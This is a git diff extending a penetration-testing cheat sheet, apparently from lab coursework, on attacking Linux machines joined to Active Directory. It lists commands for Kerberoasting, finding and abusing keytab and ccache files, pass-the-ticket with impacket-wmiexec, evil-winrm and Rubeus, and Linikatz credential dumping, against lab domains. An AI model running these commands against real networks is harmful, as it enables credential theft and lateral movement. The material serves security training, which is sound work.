@@ -340,3 +340,110 @@
 | `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request -outputfile TGS_ticket` | Request the TGS ticket of an account in a target Windows domain |
 | `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |
 | `zip -r ilfreight_bh.zip *.json`                             | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI. |
+
+
+# Identifying Linux and Active Directory Integration
+
+realm - Check If Linux Machine is Domain Joined
+```
+realm list
+```
+
+PS - Check if Linux Machine is Domain Joined
+```
+ps -ef | grep -i "winbind\|sssd"
+```
+
+Using Find to Search for Files with Keytab in the Name
+```
+find / -name *keytab* -ls 2>/dev/null
+```
+
+Reviewing Environment Variables for ccache Files.
+```
+env | grep -i krb5
+```
+
+Listing keytab File Information
+```
+klist -k -t
+```
+
+Impersonating a User with a keytab
+```
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+```
+```
+smbclient //dc01/carlos -k -c ls
+```
+
+Extracting Keytab Hashes with KeyTabExtract
+```
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+
+Log in as Carlos
+```
+su - carlos@inlanefreight.htb
+```
+
+Importing the ccache File into our Current Session
+```
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+Setting the KRB5CCNAME Environment Variable
+```
+export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+```
+
+Using Impacket with proxychains and Kerberos Authentication
+> To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
+```
+proxychains impacket-wmiexec dc01 -k
+```
+
+
+Kerberos Configuration File for INLANEFREIGHT.HTB
+```
+powen@htb[/htb]$ cat /etc/krb5.conf
+
+[libdefaults]
+        default_realm = INLANEFREIGHT.HTB
+
+<SNIP>
+
+[realms]
+    INLANEFREIGHT.HTB = {
+        kdc = dc01.inlanefreight.htb
+    }
+
+<SNIP>
+```
+
+Using Evil-WinRM with Kerberos
+```
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+Impacket Ticket Converter
+```
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+Importing Converted Ticket into Windows Session with Rubeus
+```
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
+Linikatz
+
+Linikatz is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
+
+Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
+
+
